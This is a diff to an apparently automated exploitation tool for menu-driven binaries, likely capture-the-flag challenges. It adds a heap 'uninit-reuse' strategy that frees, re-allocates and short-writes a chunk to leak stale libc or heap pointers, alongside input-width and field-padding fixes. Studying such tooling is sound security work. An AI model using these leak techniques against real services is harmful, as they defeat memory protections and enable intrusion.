@@ -81,7 +81,10 @@ def _read_width(exe: Path) -> int | None:
         m = re.search(r"mov\s+edx,0x([0-9a-fA-F]+)", ln)
         if m:
             prev_edx = int(m.group(1), 16)
-        elif "<read@plt>" in ln and "call" in ln and prev_edx in (1, 2, 3, 4, 8, 16):
+        elif "<read@plt>" in ln and "call" in ln and prev_edx in (8, 16, 24, 32, 48, 64):
+            # a fixed-WIDTH field protocol pads each field to W; W in {1,2,3,4} is a char/scalar
+            # read loop (read(fd,&c,1) until newline), NOT a per-field width -- treating it as one
+            # pads every input to 1 byte and desyncs the whole crawl, so only accept W >= 8.
             widths[prev_edx] += 1
         elif "call" in ln:
             prev_edx = None                              # a different call clobbers edx
@@ -143,12 +146,15 @@ def _spawn_menu(workdir: Path, exe: Path):
 
 
 
-def _op_writes(opt: str, fields: list, width, *, idx=0, size=0x18, data: bytes = b"") -> list:
+def _op_writes(opt: str, fields: list, width, *, idx=0, size=0x18, data: bytes = b"",
+               fill: bool = True) -> list:
     """The per-FIELD writes for one menu option: [option, field1, field2, ...]. Separate writes (not
     one blob) so an incremental driver can drain between them -- a target whose number reader is a
     fixed read(fd, buf, N)+strtoul number reader consumes N bytes per read and desyncs if several
     fields arrive in one chunk, exactly why a bulk feed failed where the one-field-at-a-time crawl
-    worked."""
+    worked. A `yn` field (a y/n confirmation in the flow) is answered "y" to proceed. `fill=False`
+    sends the `data` buffer SHORT (not padded to the size) so the chunk's tail stays UNINITIALISED --
+    an uninit-reuse leak reads that stale tail."""
     out = [menu._scalar(opt.encode(), width)]
     sz = 0
     for f in fields:
@@ -157,7 +163,20 @@ def _op_writes(opt: str, fields: list, width, *, idx=0, size=0x18, data: bytes =
         elif f == "num":
             out.append(menu._scalar(str(size).encode(), width))
             sz = size
-        else:
+        elif f == "yn" or f.startswith("yn="):
+            ans = f.split("=", 1)[1].encode() if "=" in f else menu._VALUE["yn"]
+            out.append(menu._scalar(ans, width))
+        elif not width:
+            # LINE-BASED target (fgets / read-until-newline char loop): send newline-terminated data,
+            # exactly like the crawl did -- read() returns the available bytes (it does NOT block for
+            # the full size on a pipe), and a char loop stops at the newline. NUL-padding to the size
+            # here would hang a read-until-newline loop. Short by design, so the chunk tail is left
+            # UNINITIALISED (what the uninit-reuse leak reads); fill a larger prefix only when asked.
+            body = data if data else (b"A" * min(sz, 256) if (fill and sz) else b"A")
+            out.append(menu._data(body, None))
+        elif not fill:                                   # fixed-width, short -> leave the tail uninit
+            out.append(menu._data(data or b"A", width))
+        else:                                            # fixed-width: pad each field to the size
             body = data if data else (b"A" * sz if 0 < sz <= 4096 else b"AAAA")
             out.append(body[:sz].ljust(sz, b"\x00") if 0 < sz <= 65536
                        else menu._data(body, width))
@@ -291,8 +310,17 @@ def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, ta
     for p in range(8):
         fill += _c(free, idx=p)
     fill += _c(view, idx=7)
+    # Strategy UNINIT-REUSE: a chunk whose data read does NOT fill the allocation leaves the tail
+    # uninitialised; after freeing a chunk (fd/bk = main_arena for unsorted, or a safe-linked heap
+    # fd for tcache) and re-allocating the SAME size with a SHORT write (fill=False), that stale
+    # pointer survives in the tail and a Show of the reused chunk discloses it. Distinct from the UAF
+    # read (which views a FREED index): here the chunk is live and re-read, so a notebook that NULLs
+    # the pointer on free (no UAF) still leaks. Large size -> a libc pointer; the guards below sort it.
+    reuse = (_c(add, idx=0, size=0x500, data=b"A") + _c(add, idx=1, size=0x500, data=b"A")  # guard top
+             + _c(free, idx=0) + _c(add, idx=2, size=0x500, data=b"A", fill=False)
+             + _c(view, idx=2))
     heap_fallback = None                                 # a leaked heap fd if no libc is reachable
-    for writes, show_sz in ((big, 0x500), (fill, 0x80)):
+    for writes, show_sz in ((big, 0x500), (fill, 0x80), (reuse, 0x500)):
         out = _drive(workdir, exe, writes, timeout=timeout)
         if not out:
             continue
